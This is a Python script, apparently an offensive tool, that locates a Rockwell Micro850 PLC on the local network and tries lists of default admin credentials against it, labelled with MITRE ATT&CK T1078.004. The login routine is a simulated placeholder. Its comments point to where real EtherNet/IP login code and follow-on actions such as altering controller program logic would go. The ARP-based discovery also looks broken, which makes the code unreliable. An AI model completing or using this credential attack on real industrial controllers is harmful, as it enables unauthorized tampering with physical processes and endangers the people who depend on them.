import os
import subprocess
import time
import socket

# Configuration -  CHANGE THESE IF NECESSARY.  Ideal would be to fetch these dynamically.
PLC_VENDOR = "Rockwell Automation"  #  Change if applicable to different models.
DEFAULT_USERNAME = "admin"  # Most common for Rockwell.  Can be multiple, try each.
DEFAULT_PASSWORD = "password"  # Most common for Rockwell.  Again, try several.
POTENTIAL_ADMIN_USERNAMES = ["admin", "administrator", "operator"]
POTENTIAL_ADMIN_PASSWORDS = ["password", "", "admin", "administrator", PLC_VENDOR.lower()]  #Common variations

#MITRE ATT&CK Technique T1078.004: Valid Accounts: Default Accounts
MITRE_TECHNIQUE = "T1078.004"
MITRE_TACTIC = "Lateral Movement" #  And others like Initial Access
MITRE_DESCRIPTION = "Attempting to leverage default credentials on a Rockwell Micro850 PLC to gain unauthorized access."


def find_plc_ip():
    """
    Attempts to discover the PLC's IP address on the local network.

    This uses a simplistic approach and may need modification for complex network setups.
    It attempts to ping a broadcast address and then correlate the responses.

    Returns:
        str: The IP address of the PLC if found, otherwise None.
    """
    try:
        # Get local IP address and subnet mask
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        subnet = '.'.join(local_ip.split('.')[:3])  # Assumes a class C network

        # Construct broadcast address
        broadcast_address = subnet + '.255'

        print(f"Attempting to discover PLC IP using broadcast ping to {broadcast_address}")

        # Perform an ARP scan.  Requires admin privileges.
        #  On Linux, use 'arp -a' and parse.  On macOS, use 'arp -an'
        if os.name == 'nt':  # Windows
            arp_output = subprocess.check_output(['arp', '-a'], text=True)
            for line in arp_output.splitlines():
                if PLC_VENDOR.lower() in line.lower(): #Rudimentary check, improve if possible.  MAC address OUI is better.
                    parts = line.split()
                    ip_address = parts[1]  #IP usually in the second column
                    print(f"Possible PLC IP found: {ip_address}")
                    return ip_address


        elif os.name == 'posix':  # Linux or macOS.  Requires 'arp' utility
            arp_command = ['arp', '-a'] if os.uname().sysname != 'Darwin' else ['arp', '-an']
            arp_output = subprocess.check_output(arp_command, text=True)
            for line in arp_output.splitlines():
                if PLC_VENDOR.lower() in line.lower():
                    parts = line.split()
                    if len(parts) > 1:  #Ensure there's at least an IP address
                        ip_address = parts[1].strip('()') #Remove parenthesis if present
                        print(f"Possible PLC IP found: {ip_address}")
                        return ip_address
        else:
            print("Unsupported operating system for IP discovery.")
            return None


    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None #Handle errors like missing arp utility


def attempt_login(plc_ip, username, password):
    """
    Simulates attempting to log in to the PLC.  This function should be replaced
    with actual login attempt code using a Rockwell-specific library or protocol
    (e.g., pylogix, Ethernet/IP).  This placeholder only prints the credentials
    being tried.

    Args:
        plc_ip (str): The IP address of the PLC.
        username (str): The username to try.
        password (str): The password to try.

    Returns:
        bool: True if the login attempt is successful (simulated here), False otherwise.
    """

    print(f"Attempting to log in to {plc_ip} with username: {username}, password: {password}")

    #  REPLACE THIS WITH ACTUAL LOGIN LOGIC
    #  This is where you'd use pylogix or similar library to connect
    #  to the PLC and attempt authentication.

    # Simulate successful login for demonstration purposes if certain conditions are met
    if username == DEFAULT_USERNAME and password == DEFAULT_PASSWORD:  # Example criteria
        print(f"[+] Successfully logged in to {plc_ip} with default credentials (simulated).")
        return True
    else:
        print(f"[-] Login failed for {username}:{password} (simulated).")
        return False




def exploit_default_credentials(plc_ip):
    """
    Attempts to exploit default credentials to gain access to the PLC.

    Args:
        plc_ip (str): The IP address of the PLC.
    """

    print(f"Attempting to exploit default credentials on PLC at {plc_ip}")

    #Iterate through combinations of usernames and passwords.  Prioritize common combinations.
    for username in POTENTIAL_ADMIN_USERNAMES:
        for password in POTENTIAL_ADMIN_PASSWORDS:
            if attempt_login(plc_ip, username, password):
                print(f"[+] Default credential exploitation successful on {plc_ip}!")
                print(f"    Username: {username}")
                print(f"    Password: {password}")
                print(f"    MITRE Technique: {MITRE_TECHNIQUE}")
                print(f"    MITRE Tactic: {MITRE_TACTIC}")
                print(f"    Description: {MITRE_DESCRIPTION}")

                #  Here, you would insert code to perform further actions on the PLC
                #  such as reading configuration, modifying program logic, etc.
                #  using the established connection.

                return  # Stop after successful login

    print("[-] Default credential exploitation failed.")


if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        print(f"PLC IP address found: {plc_ip}")
        exploit_default_credentials(plc_ip)
    else:
        print("PLC IP address not found.  Please ensure the PLC is on the network and reachable.")
        print("Consider manually setting the PLC_IP variable if auto-discovery fails.")